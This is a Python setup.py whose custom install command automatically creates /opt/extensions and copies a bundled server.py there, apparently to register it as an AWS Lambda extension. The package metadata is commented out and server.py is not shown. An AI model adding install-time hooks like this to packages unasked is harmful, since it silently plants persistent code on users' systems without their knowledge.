from setuptools import setup
from setuptools.command.install import install
import os
import shutil

# Custom install command to create a directory and add a file
class CustomInstallCommand(install):
    def run(self):
        # Call the parent run method
        install.run(self)

        print("RUNNING")

        # Create the directory
        target_directory = "/opt/extensions"
        if not os.path.exists(target_directory):
            os.makedirs(target_directory)
        shutil.copy(
            "lambchop/server.py",
            target_directory
        )

# Package metadata
setup(
    # name='lambchop',
    # version='0.0.1',
    # packages=['lambchop'],
    cmdclass={'install': CustomInstallCommand},
)